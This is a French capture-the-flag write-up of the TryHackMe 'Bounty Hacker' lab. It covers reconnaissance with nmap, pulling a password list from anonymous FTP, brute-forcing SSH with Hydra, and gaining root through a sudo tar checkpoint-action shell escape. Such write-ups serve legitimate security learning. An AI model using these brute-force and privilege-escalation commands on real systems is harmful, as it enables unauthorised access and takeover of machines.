---
title: Bounty Hacker
tags: [TryHackMe, Facile, Linux, FTP, Force brute]
style: border
color: thm
comments: false
description: Exploitation d'un serveur web Apache
---
Lien vers l'épreuve : <https://tryhackme.com/room/cowboyhacker>

![Logo box](https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg)

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Reconnaissance](#reconnaissance)
* [Analyse du serveur {% include dictionary.html word="FTP" %}](#analyse-du-serveur--include-dictionaryhtml-wordftp-)
* [Accéder à la machine](#accéder-à-la-machine)
* [Élévation de privilèges](#élévation-de-privilèges)

## Reconnaissance

```bash
nmap -A -T4 bountyhacker.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 15:58 CEST
Nmap scan report for bountyhacker.thm (10.10.35.165)
Host is up (0.032s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Infomir MAG-250 set-top box (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 3.7 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti AirOS 5.5.9 (88%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.80 ms 10.9.0.1
2   31.82 ms bountyhacker.thm (10.10.35.165)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.88 seconds
```

Le scan {% include dictionary.html word="NMAP" %} indique la présence d'un serveur {% include dictionary.html word="FTP" %} sur le port 21 accessible anonymement, un serveur {% include dictionary.html word="SSH" %} sur le port 22, et un serveur web Apache sur le port 80.

Le serveur web sert à raconter l'histoire de notre personnage qui semble avoir été quelque peu vantard face aux personnages de l'anime [Cowboy Bebop](https://fr.wikipedia.org/wiki/Cowboy_Bebop) et qu'il va devoir faire ses preuves.

## Analyse du serveur {% include dictionary.html word="FTP" %}

Nous récupérons les 2 documents présents sur le serveur :

```bash
ftp anonymous@bountyhacker.thm
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41895|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*******************************************|   418        5.86 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.98 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*******************************************|    68        0.65 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.49 KiB/s)
```

Le fichier `locks.txt` semble être une liste de mots de passe, et le fichier `task.txt` un plan d'action (machiavélique ?).

```terminal
cat task.txt                   
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

## Accéder à la machine

Le fichier `task.txt` contient le nom `lin` qui pourrait être un utilisateur du serveur. Nous allons tenter de trouver un mot de passe correspondant grâce à l'outil {% include dictionary.html word="Hydra" %} sur le service {% include dictionary.html word="SSH" %}.

```bash
hydra -l 'lin' -P locks.txt bountyhacker.thm ssh                        
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 16:27:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://bountyhacker.thm:22/
[22][ssh] host: bountyhacker.thm   login: lin   password: Re[...expurgé...]t3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-19 16:27:37
```

Nous obtenons le mot de passe de l'utilisateur `lin` nous permettant de nous connecter en {% include dictionary.html word="SSH" %} sur le serveur.

Dès que nous nous connectons à la machine avec les identifiants trouvés, nous arrivons sur le bureau de l'utilisateur, contenant le flag utilisateur :

```bash
ls
user.txt

cat user.txt
THM{[...expurgé...]}
```

## Élévation de privilèges

L'utilisateur `lin` est autorisé à utiliser la commande `/bin/tar` en élevant ses privilèges avec {% include dictionary.html word="sudo" %}.

```bash
sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Sur le site [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) nous trouvons le moyen d'abuser de ce privilège pour devenir `root` sur la machine.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names

id
uid=0(root) gid=0(root) groups=0(root)
```

Maintenant que nous sommes root, nous pouvons récupérer le flag root.

```bash
cd /root

ls
root.txt

cat root.txt
THM{[...expurgé...]}
```
